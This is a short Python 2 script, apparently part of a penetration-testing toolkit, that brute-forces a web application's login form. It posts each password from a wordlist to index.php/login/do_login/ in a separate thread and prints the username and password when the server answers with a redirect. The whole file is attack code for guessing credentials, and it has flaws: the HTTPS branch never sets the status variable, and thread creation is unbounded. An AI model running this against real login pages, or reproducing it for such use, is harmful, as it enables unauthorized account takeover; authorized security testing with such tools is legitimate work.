#!/usr/bin/python

import Queue
import string
import threading
import urllib
import sys
from modules import client

bold = '\033[1m'
normal = '\033[0m'

def brutelogin(target, dir, ssl, user, password):

    try:
        params = urllib.urlencode({'uName': user, 'uPassword': password.rstrip()})

        if ssl == True:
            data = client.https_post(target, dir + "index.php/login/do_login/", params)

        else:
            data, status = client.http_post(target, dir + "index.php/login/do_login/", params)

        if status == 302:
            print "\n", bold, "[+] Validate credentials found\r", normal
            print "", user + ":" + password
            sys.exit()

    except Exception, error:
        print error


def threadlogin(target, dir, ssl, user, path):

    try:
        threads = [5]
        wordlist = open(path)
        for password in wordlist:
            t = threading.Thread(target=brutelogin, args = (target, dir, ssl, user, password))
            threads.append(t)
            t.start()
    except Exception, error:
        print error
        sys.exit()
